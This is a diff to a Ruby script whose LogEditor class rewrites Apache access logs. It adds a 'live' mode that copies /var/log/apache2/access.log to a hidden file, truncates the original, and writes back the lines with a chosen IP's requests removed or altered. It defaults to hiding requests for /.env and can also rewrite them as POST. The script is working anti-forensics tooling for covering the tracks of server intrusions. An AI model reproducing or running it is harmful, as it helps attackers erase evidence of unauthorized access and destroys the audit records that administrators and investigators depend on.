@@ -1,14 +1,29 @@
 require 'ipaddr'
 require 'optparse'
+require 'fileutils'
 class LogEditor
-    def initialize(rip: nil, path: "/.env", meth: "GET", remove: nil)
+    def initialize(rip: nil, path: "/.env", meth: "GET", remove: nil, live: true, apache_log: "/var/log/apache2/access.log", tmp_log: "/var/log/apache2/.access.log")
         # replace IP
         @rip  = rip
         @path = path
         @meth = meth
+        @live = live
+        @apache_log = apache_log
+        @tmp_log    = tmp_log
+        FileUtils.cp(@apache_log, @tmp_log)
+        File.truncate(@apache_log, 0)
+    end
+    def cleanup
+        File.delete(@tmp_log)
+    end
+    def apache_log=(a)
+        @apache_log = a
     end
     def log
-        File.readlines("access.log").to_a
+        File.readlines(@tmp_log).to_a
+    end
+    def live=(l)
+        @live = l
     end
     def meth=(m)
         @meth = m
@@ -20,7 +35,14 @@ class LogEditor
         @path = pp
     end
     def file_write(text)
-        File.open("access-n.log", 'a') { |file| file.write(text) }
+        if @live
+            if File.exists?(@apache_log)
+                File.open(@apache_log, 'a') { |file| file.write(text) }
+            end
+        else
+            File.open("access-n.log", 'a') { |file| file.write(text) }
+        end    
+        
     end
     def remove
         log.each do |l|
@@ -65,6 +87,15 @@ end.parse!
 lg = LogEditor.new(rip: options[:ip], path: options[:path])
 if options[:rm]
     lg.remove
-else
+    lg.cleanup
+end
+if options[:replace]
     lg.replace
+    lg.cleanup
+end
+
+if options[:meth]
+    lg.meth = "POST"
+    lg.replace
+    lg.cleanup
 end
